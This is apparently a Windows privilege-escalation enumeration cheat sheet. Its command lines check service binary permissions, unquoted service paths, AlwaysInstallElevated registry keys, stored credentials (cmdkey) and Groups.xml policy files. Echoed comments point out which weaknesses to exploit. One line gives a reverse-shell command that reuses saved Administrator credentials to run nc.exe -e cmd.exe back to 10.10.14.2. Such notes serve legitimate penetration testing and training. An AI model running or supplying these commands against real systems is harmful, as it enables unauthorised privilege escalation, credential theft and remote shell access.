wmic service list brief

for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt

FOR /F %i in (Servicenames.txt) DO echo %i

type Servicenames.txt

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt

cacls "C:\path\to\file.exe"

echo Look for Weakness
echo "What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\Users:(F)."
echo "Or where your user/usergroup has (F) or (C) rights."

echo Unquoted Service Paths
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

echo List all drivers
driverquery

echo AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

echo
echo RunAs?
echo
echo "If there are entries, it means that we may able to runas certain user who stored his cred in windows"
echo "runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe""
echo
cmdkey /list

echo Group Policy Preference
echo
echo Output environment-variables
set

# Now we search for the groups.xml file
dir Groups.xml /s
